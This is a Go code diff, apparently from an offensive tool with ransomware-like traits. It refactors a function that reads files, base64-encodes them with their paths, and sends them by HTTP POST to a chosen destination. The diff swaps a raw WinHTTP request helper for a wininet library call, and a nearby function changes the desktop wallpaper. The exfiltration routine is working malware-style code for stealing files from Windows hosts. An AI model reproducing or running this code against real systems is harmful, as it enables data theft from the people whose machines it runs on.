@@ -8,11 +8,11 @@ import (
 	"fmt"
 	"io"
 	"os"
-	"strconv"
-	"strings"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	"gitlab.com/mjwhitta/wininet/http"
 )
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
@@ -38,137 +38,11 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			data = []byte(path + " " + b64)
 
 			// Send Message
-			if e = postRequest(dst, headers, data); e != nil {
+			if _, e = http.Post(dst, headers, data); e != nil {
 				fmt.Println(e.Error())
 			}
 		}
 	}
-}
-
-func postRequest(
-	dst string,
-	headers map[string]string,
-	data []byte,
-) error {
-	var connHndl uintptr
-	var e error
-	var endpoint *uint16
-	var combinedHdrs string
-	var hdrs *uint16
-	var method *uint16
-	var path *uint16
-	var port uint64
-	var query string
-	var reqHndl uintptr
-	var sessionHndl uintptr
-	var tmp []string
-	var ua *uint16
-	var winhttp *windows.LazyDLL = windows.NewLazySystemDLL("Winhttp")
-	var winhttpAccessTypeAutomaticProxy uintptr = 4
-	var winhttpFlagSecure uintptr = 0x00800000
-
-	// Remove protocol
-	if strings.HasPrefix(dst, "https://") {
-		dst = strings.Replace(dst, "https://", "", 1)
-	} else {
-		dst = strings.Replace(dst, "http://", "", 1)
-		winhttpFlagSecure = 0
-	}
-
-	// Strip query string
-	tmp = strings.SplitN(dst, "/", 1)
-	dst = tmp[0]
-	query = "/"
-	if len(tmp) > 1 {
-		query = tmp[1]
-	}
-
-	// Strip port
-	tmp = strings.Split(dst, ":")
-	if len(tmp) > 1 {
-		if port, e = strconv.ParseUint(tmp[1], 10, 64); e != nil {
-			return e
-		}
-	}
-	dst = tmp[0]
-
-	// Combine headers
-	for k, v := range headers {
-		combinedHdrs += "\n\r" + k + ": " + v
-	}
-	combinedHdrs = strings.TrimSpace(combinedHdrs)
-
-	// Create LPCWSTRs
-	if endpoint, e = windows.UTF16PtrFromString(dst); e != nil {
-		return e
-	}
-
-	if hdrs, e = windows.UTF16PtrFromString(combinedHdrs); e != nil {
-		return e
-	}
-
-	if method, e = windows.UTF16PtrFromString("POST"); e != nil {
-		return e
-	}
-
-	if path, e = windows.UTF16PtrFromString(query); e != nil {
-		return e
-	}
-
-	ua, e = windows.UTF16PtrFromString("Go-http-client/1.1")
-	if e != nil {
-		return e
-	}
-
-	// Create session
-	sessionHndl, _, _ = winhttp.NewProc("WinHttpOpen").Call(
-		uintptr(unsafe.Pointer(ua)),
-		winhttpAccessTypeAutomaticProxy,
-		0,
-		0,
-		0,
-	)
-	if sessionHndl == 0 {
-		return nil
-	}
-
-	// Create connection
-	connHndl, _, _ = winhttp.NewProc("WinHttpConnect").Call(
-		sessionHndl,
-		uintptr(unsafe.Pointer(endpoint)),
-		uintptr(port),
-		0,
-	)
-	if connHndl == 0 {
-		return nil
-	}
-
-	// Create HTTP request
-	reqHndl, _, _ = winhttp.NewProc("WinHttpOpenRequest").Call(
-		connHndl,
-		uintptr(unsafe.Pointer(method)),
-		uintptr(unsafe.Pointer(path)),
-		0,
-		0,
-		0,
-		winhttpFlagSecure,
-	)
-	if reqHndl == 0 {
-		return nil
-	}
-
-	// Send HTTP request
-	winhttp.NewProc("WinHttpSendRequest").Call(
-		reqHndl,
-		uintptr(unsafe.Pointer(hdrs)),
-		uintptr(len([]byte(combinedHdrs))),
-		uintptr(unsafe.Pointer(&data[0])),
-		uintptr(len(data)),
-		uintptr(len(data)),
-		0,
-	)
-
-	return nil
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
